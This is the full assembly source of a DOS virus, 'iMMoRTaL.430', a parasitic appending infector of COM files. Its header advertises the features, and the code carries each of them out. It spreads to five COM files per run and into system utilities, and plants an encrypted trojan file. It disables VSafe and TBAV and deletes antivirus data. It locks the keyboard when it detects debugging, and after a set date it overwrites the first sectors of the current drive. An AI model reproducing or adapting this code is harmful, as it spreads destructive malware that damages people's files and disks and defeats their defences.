%OUT iMMoRTaL.430 virus by Immortal EAS.
%OUT Little parasatic non-tsr appending virus. Features:
%OUT  + Trojanizes 'c:\run-me.com' with a dangerous bug!
%OUT  + Auto-Infects 'c:\dos\keyb.com' & 'c:\dos\doskey.com'
%OUT  + Anti-tracing meganism
%OUT  + 13% chance on a keyboard lock
%OUT  + 50% chance on a little message
%OUT  + Quick spreading routine, 5 infects per run
%OUT  + Upwards traversal (DotDot technique!)
%OUT  + Some things are encrypted.
%OUT AV Fool techniques:
%OUT  + VSafe takedown  (!!)
%OUT  + TBScanX takedown (!!)
%OUT  + Simple but working version to get Delta Offset  ("E")
%OUT  + Z.COM filespec will be changed to *.COM  ("S")
%OUT  + "F" simply does not appear (!!)
%OUT  + Cloaked interrupt 26h ("D")
%OUT  + Trojan bug is encrypted! ("D")
%OUT  + On 11-08+ (My birthday!) it will erase the first 25h sectors! 

.model  tiny
.code
    
    ORG     100h                    ;COM file remember?!?

start:  push    ax                      ;Some junk to fool TBAV
    pop     bx
    
    mov     ax,0fa01h               ;Let's take down MSAV!!!
    mov     dx,05945h
    int     16h
    
    mov     ax,0ca02h               ;Let's take down TBAV!!!
    mov     bl,00h
    int     2fh

call    getdlt                  ;Nice way to get delta offset!
realst:
getdlt: pop     bp
    sub     bp, offset getdlt

codest: lea     si,[orgbts+bp]          ;Restore first 4 bytes        
    mov     di,0100h
    movsw
    movsw
    
    push    cs                      ;DS <==> CS
    pop     ds
    
    lea     dx,[eov+bp]             ;Set DTA address
    mov     ah,1ah
    int     21h
    
    mov     al,01h                  ;Detect INT 1 trace...
    mov     ah,35h
    int     21h
    push    es
    pop     ax
    cmp     ax,70h                  ;Default segment INT 1 & 3
    jne     lockkb
    
    mov     al,03h                  ;Detect INT 3 trace...
    mov     ah,35h
    int     21h
    push    es
    pop     ax
    cmp     ax,70h                  ;Default segment INT 1 & 3
    jne     lockkb
    
    mov     ah,2ch                  ;13% chance to lock keyboard!
    int     21h
    cmp     dl, 0dh
    jg      nolock

lockkb: mov     al,82h                  ;Actual keyboard lock!
    out     21h,al
    
nolock: lea     dx,[offset keyb+bp]     ;Infect 'c:\dos\keyb.com'
    call    infect
    lea     dx,[offset doskey+bp]   ;Infect 'c:\dos\doskey.com'
    call    infect

    mov     ah,3ch                  ;Trojanize 'c:\run-me.com'!
    mov     cx,0000h
    lea     dx,[offset bugname+bp]
    int     21h
    
    lea     dx,[offset lilbug+bp]   ;Decrypt 'lilbug'
    mov     si, lilsize
    call    crypt
    
    mov     bx,ax                   ;Write 'lilbug'
    mov     ax,4000h
    mov     cx,lilsize
    lea     si,[offset lilbug+bp]
    int     21h

    lea     dx,[offset lilbug+bp]  ;Encrypt 'lilbug'
    mov     si,lilsize
    call    crypt
    
    mov     ax,3e00h
    int     21h

welcme: mov     ah,2ch                  ;50% chance to print message!
    int     21h
    cmp     dl,32h
    jg      spread

    mov     si, 12h                 ;Decrypt the message
    lea     dx, [offset welcome+bp]
    call    crypt

wr_msg: mov     ah,09h                  ;Bingo! print message!
    int     21h
    
    mov     si, 12h                 ;Re-encrypt the message
    call    crypt
    
    mov     ah,00h                  ;Wait for a key!
    int     16h
    jmp     spread
            
welcome db      028h,00Ch,00Ch,02Eh,013h,015h,020h,00Dh,06Fh,074h
    db      074h,071h,060h,060h,046h,04Bh,04Ch,065h
    ;iMMoRTaL.550!! Ctrl-G CR LF $

spread: call    killav
    mov     byte ptr [infcnt+bp],0
spred:  mov     ah,4eh                  ;Findfirst
    lea     dx,[fspec+bp]           ;Filespec=*.COM
    
fnext:  cmp     byte ptr [infcnt+bp],5
    je      exit_v
    
    mov     byte ptr [fspec+bp],'*'
    int     21h
    jc      DotDot                  ;No more files found? Go to '..'
    mov     byte ptr [fspec+bp],'z'
    
    lea     dx, [eov+1eh+bp]
    call    infect

nextf:  mov     ah,4fh                  ;Find next file
    jmp     fnext

dotdot: call    killav
    mov     byte ptr [fspec+bp],'z'
    mov     ax,3b00h                ;Dot-Dot...
    lea     dx,[bp+offset Dot_Dot]
    int     21h
    jc      exit_v
    jmp     spred

exit_v: mov     ah,2ah                  ;If date is 11-08+ screw current drv.
    int     21h
    cmp     dh,11h
    jl      re_dta
    cmp     dl,08h
    jl      re_dta

    lea     dx,[offset welcome+bp]
    mov     si, 12h
    call    crypt

    mov     bx,dx
    mov     ah,19h
    int     21h
    mov     cx,0025h
    mov     dx,0
    push    ds
    pop     es
    mov     byte ptr [offset int26h+1+bp],26h
int26h: int     19h                     ;Cloaked interrupt 26h
    add     sp,2

re_dta: mov     ah,1ah                  ;Reset DTA
    mov     dx,0080h
    int     21h

    mov     di,0100h                ;Return control to original file!
    push    di
    ret

infect: mov     ax,3d02h                ;Open file
    int     21h

    jc      exit_i                  ;Error opening file, next!

    xchg    bx,ax

    mov     cx,0004h                ;Read first 4 bytes for check
    mov     ah,3fh                  ; if already infected!
    lea     dx,[orgbts+bp]
    int     21h

    cmp     byte ptr [orgbts+bp+3],'I' ;Already infected
    jz      shutit

    mov     ax,4202h                ;Goto eof
    sub     cx,cx                   ;2 byte version of mov cx,0!!
    cwd                             ;1 byte version of mov dx,0!!
    int     21h

    sub     ax,0003h                ;Use our jmp table
    mov     word ptr [bp+jmptbl+1],ax

    mov     ah,40h                  ;Implend our viral code into victim
    mov     cx,eov-start
    lea     dx,[bp+start]
    int     21h

    mov     ax,4200h                ;Goto SOF
    sub     cx,cx
    cwd
    int     21h

    mov     ah,40h                  ;Write first four bytes over
    mov     cx,0004h                ; the original
    lea     dx,[bp+jmptbl]
    int     21h
    add     byte ptr [infcnt+bp],1

shutit: mov     ah,3eh                  ;Close victim
    int     21h
exit_i: ret

crypt:  mov     cx, si
    mov     si, dx
crypt1: xor     byte ptr [si], 41h
    inc     si
    dec     cx
    jnz     crypt1
    ret

killav: mov     ax, 4301h               ;Kill 'ANTI-VIR.DAT'
    mov     cx, 0000h
    lea     dx, [offset av_dat+bp]
    int     21h
    mov     ah,41h
    int     21h
    ret

fspec   db      'z.com',0
infcnt  db      0
av_dat  db      'anti-vir.dat',0
dot_dot db      '..',0
keyb    db      'c:\dos\keyb.com',0
doskey  db      'c:\dos\doskey.com',0
bugname db      'c:\run-me.com',0

lilbug  db      0F5h,06Dh,08Ch,060h,0C1h,0BBh,04Ch,0AAh,052h,0F8h
    db      025h,041h,0FBh,041h,041h,04Fh,05Eh,0FAh,041h,040h
    db      0F5h,043h,08Ch,067h,0C2h,085h,043h,082h,05Dh,041h

lilsize equ     1fh

jmptbl  db      0e9h,00h,00h,'I'
orgbts: db      90h,90h,90h,90h
eov:
end     start
